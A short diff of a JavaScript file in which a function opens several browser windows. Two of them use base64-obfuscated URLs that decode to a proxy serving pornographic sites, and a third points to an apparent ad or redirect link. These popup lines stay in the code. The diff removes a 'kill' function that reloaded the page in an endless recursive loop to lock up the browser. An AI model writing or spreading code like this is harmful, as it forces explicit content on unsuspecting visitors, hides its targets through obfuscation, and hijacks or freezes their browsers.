@@ -63,14 +63,7 @@ function proCreate() {
 		openWindow(atob('aHR0cHM6Ly93ZWVkd2VkZHdld2Vkd2Rld2R3ZXdkZWRld2Rld2Rld2V3ZWVkd2Vkd2VlZC52ZXJjZWwuYXBwL3Byb3h5L2h0dHBzOi8vcG9ybmh1Yi5jb20='));
 		openWindow(atob('aHR0cHM6Ly93ZWVkd2VkZHdld2Vkd2Rld2R3ZXdkZWRld2Rld2Rld2V3ZWVkd2Vkd2VlZC52ZXJjZWwuYXBwL3Byb3h5L2h0dHBzOi8vcG9ybi5jb20='));
 		openWindow('https://agacelebir.com/4/2888721');
-		kill();
 	}
-}
-function kill(){
-while(true){
-window.location.reload();
-kill();
-}
 }
 
 function newXlt() {
